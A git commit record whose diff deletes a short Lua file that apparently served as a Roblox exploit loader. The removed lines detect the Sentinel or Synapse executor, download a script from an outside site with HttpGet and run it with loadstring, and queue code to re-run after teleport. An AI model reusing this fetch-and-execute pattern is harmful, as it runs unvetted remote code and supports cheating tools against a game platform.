ff3473ece23e38c5062ea923044a376abda1ee97
chimnguu <57534799+chimnguu@users.noreply.github.com>
2021-06-10 15:07:22 +0700

    Delete zuagay.lua

--- zuagay.lua
+++
@@ -1,8 +0,0 @@
-print(getgenv().Key)
-local buoi = [[
-getgenv().Key = "]].. Setting[1]..'"'..[[
-loadstring('https://raw.githubusercontent.com/chimnguu/ngu/master/zuagay.lua')()
-]]
-local Exploit = secure_load and "Sentinel" or syn and "Synapse"
-loadstring(game:HttpGet("https://ego-d.xyz/Script?Exploit="..Exploit))()
-syn.queue_on_teleport(buoi)
